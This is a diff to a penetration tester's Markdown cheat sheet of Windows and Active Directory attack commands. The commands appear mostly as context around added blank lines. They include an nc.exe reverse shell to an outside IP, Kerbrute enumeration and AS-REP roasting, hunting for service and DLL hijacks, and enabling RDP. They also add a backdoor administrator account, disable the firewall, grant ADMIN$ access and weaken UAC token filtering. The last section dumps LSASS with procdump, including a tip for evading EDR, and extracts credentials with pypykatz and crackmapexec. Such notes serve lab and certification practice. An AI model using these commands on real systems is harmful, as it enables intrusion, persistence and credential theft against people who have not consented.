@@ -38,17 +38,21 @@ Probably wont put any linux since its straightforward but windows, idk man privs
     - Establish persistance
 
 ### Credential one-liner
+
 ```$pwd = ConvertTo-SecureString 'password' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)```
 
 ### Kerbrute
+
 ```kerbrute userenum -d {domain} /wordlist --dc {ip}```
 
 If we find a valid username see if preauth is set, easy win
+
 ```impacket-GetNPUsers -request -dc-ip {ip} domain/username```
 
 
 
 ### PowerShell
+
 ```PS> Start-Process -FilePath "C:\Users\User\nc.exe" -ArgumentList "-e cmd.exe 10.10.15.49 443" -Credential $creds```
 
 ```PS> Get-LocalUser```
@@ -101,12 +105,14 @@ DLL Safe boot order:
 - Execute ProcMon to monitor the binary as it is started to see what DLLs it is loading
 - Create file can be used to create or open a file, dont be fooled!
 - See dummy_dll.cpp for an example dll file
+
 ```PS> Restart-Service {service}```
 
 
 ### Unquoted service paths
 - If the service path is unquoted and contains spaces we can probably hijack
 - PowerUp.ps1 can find unquoted service paths:
+
 ```PS> Get-UnquotedService```
 
 ```PS> Get-CimInstance -ClassName win32_service | Select Name,State,PathName```
@@ -115,6 +121,7 @@ DLL Safe boot order:
 
 
 ### Scheduled Tasks
+
 ```PS> schtasks /query /fo LIST /v```
 
 ```PS> Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }```
@@ -125,19 +132,23 @@ DLL Safe boot order:
 
 
 ### Enable RDP
+
 ```cmd> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
 
 ```cmd> reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
 
 ### Add new user
+
 ```cmd> net user yam P@ssword123 /add```
 
 ```cmd> net localgroup Administrators yam /add```
 
 ### Disable firewalls
+
 ```cmd> netsh advfirewall set allprofiles state off```
 
 ### Share access
+
 ```PS> Grant-SmbShareAccess -Name "ShareName" -AccountName "DOMAIN\UserOrGroupName" -AccessRight Full -Force```
 
 ```PS> Grant-SmbShareAccess -Name \"ADMIN$\" -AccountName \"MS01\yam\" -AccessRight Full -Force```
@@ -147,6 +158,7 @@ DLL Safe boot order:
 ```cmd> reg add \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f```
 
 ### Easy SMB transfers
+
 ```start smb server with impacket-smbserver```
 
 ```cmd> net use \\10.10.10.10\share /u:df df```
@@ -158,6 +170,7 @@ DLL Safe boot order:
 ```cmd> net use /d```
 
 ### Dumping LSASS without mimikatz
+
 ```cmd> whoami /priv```
 
 make sure that we have SeDebugPrivilege
@@ -167,23 +180,29 @@ on modern machines windows will kill any PS process that attempts to dump LSASS 
 You can create a dump of LSASS using the task manager, right click on the lsass.exe process and select create dump file, then load this into mimikatz
 
 Being connected with xfreerdp is great because we can use this to automatically mount a shared drive to copy files using the following syntax:
+
 ```$ xfreerdp /v:{ipaddress} /u:USERNAME /p:PASSWORD /d:DOMAIN /drive:SHARE,/path/shared```
 
 This creates a shared drive named SHARE on the windows machine, which we can then drop the dump into
 We can then use pypykatz to extract the stored credentials from the dump:
+
 ```$ pypykatz lsa minidump lsass.DMP```
 
 #### PROCDUMP
+
 ```cmd> procdump.exe -accepteula -ma lsass.exe out.dmp```
 
 Some EDR solutions will be alerted by this and block based on the "lsass" so instead we can find the process ID and pass that
+
 ```PS> get-process lsass```
 
 ```PS> tasklist | findstr lsass```
 
 Then dump
+
 ```cmd> procdump.exe -accepteula -ma {id} out.dmp```
 
 
 #### CRACKMAPEXEC!!!
+
 ```$ crackmapexec smb {ip address} -u administrator -p Password123 --lsa```
